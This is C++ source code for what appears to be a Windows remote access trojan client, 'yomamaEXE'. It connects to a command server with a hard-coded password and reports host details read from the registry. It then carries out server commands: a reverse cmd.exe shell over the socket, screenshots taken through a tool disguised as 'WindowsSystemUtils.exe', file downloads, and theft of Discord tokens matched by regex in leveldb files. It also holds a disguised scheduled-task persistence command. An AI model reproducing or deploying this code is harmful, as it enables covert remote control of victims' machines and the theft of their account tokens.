// yomamaEXE.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include "custom.h"
#pragma comment(lib, "urlmon.lib")

#define BUFFERSIZE 8192
#define DEFAULT_BUFLEN 1024
#define SUCCESS_CODE "SUCCESS"
#define ERROR_CODE "ERROR"

// 15593
#define PORT 6699
using namespace std;


// 198.91.166.78
// 3.131.147.49
const char szHost[] = "127.0.0.1";
const char passwd[] = "pontifex";
//const char szHost[] = "169.254.63.63";

char command[256];
char buffer[256];
PacketType packetType;
std::string scCMD;
std::string nirPath;
std::string bdPath;

std::string scLoc;

int counter = 0;
const int BUFLEN = 0;

char folder[200];
std::string sFolder;

LPWSTR fullFilePath[MAX_PATH];

using json = nlohmann::json;


struct SystemInfo
{
    std::string HOSTNAME;
    std::string OS;
    std::string ARCH;
    std::string MGUID;
    XTOSTRUCT(O(HOSTNAME, OS, ARCH, MGUID));
};

struct Basic
{
    std::string local_addr;
    std::string user_name;
    XTOSTRUCT(O(local_addr, user_name));
};

struct Intel
{
    Basic basic;
    SystemInfo sysinfo;
    XTOSTRUCT(O(basic, sysinfo));
};

std::string sysinfo(SOCKET sock)
{
    char username[255];
    DWORD bufferSize = BUFFERSIZE;
    RegGetValueA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "RegisteredOwner", RRF_RT_ANY, NULL, &username, &bufferSize);

    char hostname[255];
    DWORD hSize = BUFFERSIZE;
    RegGetValueA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ComputerName", "ComputerName", RRF_RT_ANY, NULL, &hostname, &hSize);

    char os[255];
    DWORD oSize = BUFFERSIZE;
    RegGetValueA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductName", RRF_RT_ANY, NULL, &os, &oSize);

    char arch[50];
    RegGetValueA(HKEY_LOCAL_MACHINE, "\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment", "PROCESSOR_ARCHITECTURE", RRF_RT_ANY, NULL, &arch, &bufferSize);

    char guid[255];
    DWORD gSize = BUFFERSIZE;
    RegGetValueA(HKEY_LOCAL_MACHINE, "\SOFTWARE\\Microsoft\\Cryptography", "MachineGuid", RRF_RT_ANY, NULL, &guid, &gSize);

    // START - get local ipv4 address
    struct sockaddr_in name;
    int namelen = sizeof(name);
    getsockname(sock, (struct sockaddr*)&name, &namelen);

    char buffer[80];
    const char* local = inet_ntop(AF_INET, &name.sin_addr, buffer, 80);
    // END - get local ipv4 address

    SystemInfo sysStruct;
    sysStruct.HOSTNAME = hostname;
    sysStruct.OS = os;
    sysStruct.ARCH = arch;
    sysStruct.MGUID = guid;

    Basic basicStruct;
    basicStruct.local_addr = local;
    basicStruct.user_name = username;

    Intel intel;
    intel.basic = basicStruct;
    intel.sysinfo = sysStruct;

    std::string json = x2struct::X::tojson(intel);

    return json;
}

BOOL setBackground(std::string image_path)
{
    int dirSize = 5;  //Will be automated later. 
    int bgChoice = 0; //Index of chosen wallpaper. 

    srand((unsigned int)time(NULL));
    bgChoice = rand() % dirSize + 1;
    //Convert the index choice into a usable filename string.

    if (SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (PVOID)image_path.c_str(),
        SPIF_UPDATEINIFILE | SPIF_SENDCHANGE) != 0)
    {
        return true;
    }

    return false;
}

void downloadFile(SOCKET sock) {
    int index = 0;
    char arguementsBuf[256];
    ZeroMemory(arguementsBuf, sizeof(arguementsBuf));
    recv(sock, arguementsBuf, sizeof(arguementsBuf), 0);
    std::string s_args;
    s_args += arguementsBuf;
    auto json_args = json::parse(s_args);
    int size = json_args["size"];
    std::string dFileName = json_args["name"];

    std::string dFilePath;
    dFilePath += folder;
    dFilePath += "\\";
    dFilePath += dFileName;
    std::cout << size << std::endl;
    std::cout << dFileName << std::endl;
    FILE* fp = fopen(dFilePath.c_str(), "wb+");
    char buffer[DEFAULT_BUFLEN] = { 0 };
    int ret;
    while (index <= size) {
        ret = recv(sock, buffer, DEFAULT_BUFLEN, 0);
        if (ret <= 0) {
            break;
        }
        fwrite(buffer, (int)ret, 1, fp);
        index += 1024;
    }
    fclose(fp);
    if (setBackground(dFilePath) == true) {
        send(sock, SUCCESS_CODE, sizeof(SUCCESS_CODE), 0);
    } 
    else {
        send(sock, ERROR_CODE, sizeof(ERROR_CODE), 0);
    }
}


std::vector<std::string> split_string_by_newline(const std::string& str)
{
    auto result = std::vector<std::string>{};
    auto ss = std::stringstream{ str };

    for (std::string line; std::getline(ss, line, '\n');) {
        result.push_back(line);
    }
    return result;
}

std::string exec(const char* cmd) {
    char buffer[128];
    std::string result = "";
    FILE* pipe = _popen(cmd, "r");
    if (!pipe) throw std::runtime_error("popen() failed!");
    try {
        while (fgets(buffer, sizeof buffer, pipe) != NULL) {
            result += buffer;
        }
    }
    catch (...) {
        _pclose(pipe);
        throw;
    }
    _pclose(pipe);
    return result;
}

void extractToken(std::string folderPath, std::vector<std::string>& tokenVector) {
    std::string cmd = "cd \"" + folderPath + "\"&& dir /b /s";
    //std::cout << cmd << std::endl;
    std::string result = exec(cmd.c_str());
    std::vector<std::string> fileVector;
    fileVector = split_string_by_newline(result);

    std::regex token_reg(R"([\w-]{24}\.[\w-]{6}\.[\w-]{27})");

    for (std::string name : fileVector) {
        //std::cout << name << std::endl;

        if (name.substr(name.find_last_of(".") + 1) == "log" || (name.substr(name.find_last_of(".") + 1) == "ldb")) {
            std::string fileData;
            std::smatch token;

            std::ifstream LogFile(name, std::ifstream::binary);
            while (std::getline(LogFile, fileData)) {
                //std::cout << fileData << std::endl;
                if (regex_search(fileData, token, token_reg) == true) {
                    tokenVector.push_back(token.str(0));
                    //break;
                }
            }

            LogFile.close();

        }
    }
}

void processCommands(SOCKET sock, char* packetHashID) {
    int payloadSize;


    if (PacketHandler::recv_INT(sock, payloadSize)) {
        std::cout << "bruh\n";
        char* buf = new char[payloadSize];
        PacketHandler::_recvall(sock, payloadSize, buf);
        std::cout << buf << std::endl;


        auto jsonObj = json::parse(buf);

        std::string commandID = jsonObj["commandID"];

        std::cout << commandID << std::endl;

        if (commandID == "free") {
            printf("Goodbye");
            closesocket(sock);
            WSACleanup();
            ExitProcess(EXIT_SUCCESS);
        }
        else if (commandID == "shell") {
            char RecvData[DEFAULT_BUFLEN];
            memset(RecvData, 0, sizeof(RecvData));
            int RecvCode = recv(sock, RecvData, DEFAULT_BUFLEN, 0);
            if (RecvCode <= 0) {
                closesocket(sock);
                WSACleanup();
            }
            else {
                LPTSTR szCmdline = _tcsdup(TEXT("cmd.exe"));
                STARTUPINFO sinfo;
                PROCESS_INFORMATION pinfo;
                memset(&sinfo, 0, sizeof(sinfo));
                sinfo.cb = sizeof(sinfo);
                sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)sock;
                CreateProcess(NULL, szCmdline, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
                WaitForSingleObject(pinfo.hProcess, INFINITE);
                CloseHandle(pinfo.hProcess);
                CloseHandle(pinfo.hThread);

            }
        }
        else if (commandID == "fat") {
            std::cout << "allah habibi\n";
            json message = { "message", "may allah be my habibi" };
            PacketHandler::sendPacket(sock, PacketType::Command, message, packetHashID);
        }
        else if (commandID == "screenshot") {
            system(scCMD.c_str());
            std::cout << "bruh 0" << std::endl;
            Sleep(1000);

            FILE* fp = fopen(scLoc.c_str(), "rb"); //Open the file in binary mode 

            if (fp == NULL) {
                printf("Cannot open file, press any key to exit!\n");
            }
            char buffer[DEFAULT_BUFLEN] = { 0 };   //Buffer
            int nCount;
            while ((nCount = fread(buffer, 1, DEFAULT_BUFLEN, fp)) > 0) {
                send(sock, buffer, nCount, 0);
            }
            //shutdown(sock, SD_SEND);
            send(sock, "FIN", 4, 0);

        }
        else if (commandID == "bgchange") {
            downloadFile(sock);
        }
        else if (commandID == "token_grabber") {
            std::vector<std::string> tokenVector;
            std::string path = R"(%appdata%\discord\Local Storage\leveldb)";
            extractToken(path, tokenVector);

            json lootMessageJSON;
            lootMessageJSON["desktop_client"] = tokenVector;
            PacketHandler::sendPacket(sock, PacketType::Command, lootMessageJSON, packetHashID);
        }
    }

}

void connectToControl()
{
    while (counter < 3) {
        Sleep(5000);
        WSAData wsaData;
        WORD DllVersion = MAKEWORD(2, 1);
        if (WSAStartup(DllVersion, &wsaData) != 0) {
            fprintf(stderr, "WSAStartup()\n");
            getchar();
            ExitProcess(EXIT_FAILURE);
        }
        
        // Create socket
        SOCKET sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
        if (sock < 0) {
            fprintf(stderr, "socket()\n");
            getchar();
            ExitProcess(EXIT_FAILURE);
        }

        // Get Server info
        HOSTENT* host = gethostbyname(szHost);
        if (host == nullptr) {
            closesocket(sock);
            fprintf(stderr, "gethostbyname()\n");
            getchar();
            ExitProcess(EXIT_FAILURE);
        }

        // Define server info
        SOCKADDR_IN sin;
        ZeroMemory(&sin, sizeof(sin));
        sin.sin_port = htons(PORT);
        sin.sin_family = AF_INET;
        memcpy(&sin.sin_addr.S_un.S_addr, host->h_addr_list[0], sizeof(sin.sin_addr.S_un.S_addr));

        // Connect to server
        if (connect(sock, (const sockaddr*)&sin, sizeof(sin)) != 0) {
            closesocket(sock);
            WSACleanup();
            counter++;
            continue;
        }
        else {
            
            send(sock, passwd, strlen(passwd), 0);

            Sleep(1000);

            std::string szMsg = sysinfo(sock);
            send(sock, szMsg.c_str(), strlen(szMsg.c_str()), 0);

            PacketType packetType;
            char packetHashID[9];
            
            while (1) {
                
            
                
                if (PacketHandler::recv_PacketType(sock, packetType)) {
                    
                    recv(sock, packetHashID, sizeof(packetHashID), 0);
                    //std::cout << packetHashID << std::endl;
                    std::cout << packetHashID << std::endl;
                    switch (packetType)
                    {
                    case PacketType::Command:
                        processCommands(sock, packetHashID);
                    case PacketType::FileTransfer:
                        break;
                    default:
                        break;
                    }
                }

                
                
                
            }
        }
    }

}




std::string CurrentPath;



int main()
{
    //FreeConsole();
    //system("schtasks /create /sc MINUTE /tn WindowsTasksHost /mo 1 /tr " + getCurrentPath())
    std::cout << "hello world" << std::endl;
    
    auto j3 = json::parse("{ \"happy\": 12, \"pi\": 3.141 }");
    int x = j3["happy"];
    x++;
    std::cout << x;

    // Initialize some paths for later use
    GetTempPathA(sizeof(folder), folder);
    sFolder = folder;
    
    nirPath = sFolder + "\WindowsSystemUtils.exe";
    scCMD = nirPath + " savescreenshot " + sFolder + "\image.jpeg";
    scLoc = sFolder + "\image.jpeg";

    bdPath = sFolder + "\WindowsHostManager.exe";
    std::string taskCMD = "schtasks /f /create /sc MINUTE /tn WindowsTasksHost /mo 1 /tr " + bdPath;
    //system(taskCMD.c_str());

    // START: testing
    /*
    std::vector<std::string> tokenVector;
    std::string path = R"(%appdata%\discord\Local Storage\leveldb)";
    extractToken(path, tokenVector);
    for (std::string token : tokenVector) {
        std::cout << token << std::endl;

    }
    */
    // END: testing

    connectToControl();
    
    ExitProcess(EXIT_SUCCESS);
}
